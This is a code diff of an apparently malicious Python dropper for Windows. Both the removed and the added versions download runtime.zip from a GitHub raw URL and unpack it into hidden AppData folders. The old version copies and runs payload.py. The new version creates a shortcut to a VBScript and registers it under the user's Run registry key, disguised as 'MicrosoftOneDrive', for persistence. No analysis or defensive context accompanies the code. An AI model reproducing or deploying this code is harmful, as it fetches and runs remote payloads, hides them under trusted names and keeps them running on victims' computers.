@@ -1,28 +1,25 @@
 import os
-import subprocess
+os.system("pip install -q requests winshell")
 import getpass
 from zipfile import ZipFile
-import shutil
 import requests
-
+import winreg
+import winshell
 user = getpass.getuser()
 
 def main():
 
     r = requests.get("https://github.com/spxctrzz/adawdgsdfagdf/raw/refs/heads/main/runtime.zip")
-    with open(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip", "wb") as f:
+    with open(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip", "wb") as f:
         f.write(r.content)
-    with ZipFile(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip", "r") as f:
-        f.extractall(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime")
-    shutil.copy(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\persist.py", fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\persist.py")
-    shutil.copy(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\runner.bat", fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\runner.bat")
-    shutil.copy(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\run.vbs", fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\run.vbs")
-    shutil.copy(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\runcut.lnk", fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\Connections\runcut.lnk")
-    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\persist.py")
-    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\runner.bat")
-    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\run.vbs")
-    os.remove(fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime.zip")
-    subprocess.run(["python", fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime\payload.py"], cwd=fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\runtime")
+    with ZipFile(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip", "r") as f:
+        f.extractall(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime")
+    os.remove(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip")
+    with winshell.shortcut(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\runcut.lnk") as shortcut:
+        shortcut.path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\run.vbs"
+    runkey = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+    winreg.SetValueEx(runkey, "MicrosoftOneDrive", 0, winreg.REG_SZ, fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\runcut.lnk")
+    runkey.Close()
 
 
 main()
